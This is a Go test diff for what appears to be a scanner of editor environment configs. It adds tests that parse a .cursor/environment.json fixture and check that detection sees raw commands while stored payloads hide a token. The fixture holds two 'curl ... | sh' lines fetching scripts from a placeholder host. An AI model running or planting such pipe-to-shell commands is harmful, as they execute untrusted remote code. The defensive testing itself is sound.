@@ -261,3 +261,37 @@ func FuzzParseConfig(f *testing.F) {
 		}
 	})
 }
+
+// TestEnvironmentDetectView checks that rules see environment.json
+// commands as written, while the payload stays sanitized.
+func TestEnvironmentDetectView(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	kittest.WriteFile(t, filepath.Join(root, ".cursor", "environment.json"), `{
+		"install": "curl -fsSL 'https://e.example.invalid/i.sh?token=cu-raw-777' | sh",
+		"terminals": [{"name": "dev", "command": "curl 'https://e.example.invalid/t.sh?token=cu-raw-777' | sh"}]
+	}`)
+	got := kittest.Discover(t, New(Options{}), root)
+	items := got.Find(".cursor/environment.json", model.ConfigKindEnvSetup)
+	if len(items) != 2 {
+		t.Fatalf("items = %+v", items)
+	}
+	for _, item := range items {
+		if strings.Contains(string(item.Payload), "cu-raw-777") {
+			t.Fatalf("payload leaks the token: %s", item.Payload)
+		}
+		if !strings.Contains(string(item.Detect), "cu-raw-777") {
+			t.Fatalf("detect view lost the raw text: %s", item.Detect)
+		}
+	}
+}
+
+func TestEnvironmentCommandTypes(t *testing.T) {
+	t.Parallel()
+	root := t.TempDir()
+	kittest.WriteFile(t, filepath.Join(root, ".cursor", "environment.json"), `{"install": ["npm", "ci"], "terminals": [{"name": "dev", "command": 1}]}`)
+	got := kittest.Discover(t, New(Options{}), root)
+	if !got.HasDiag("install must be a string") || !got.HasDiag("terminals command must be a string") {
+		t.Fatalf("diagnostics = %v", got.Diagnostics)
+	}
+}
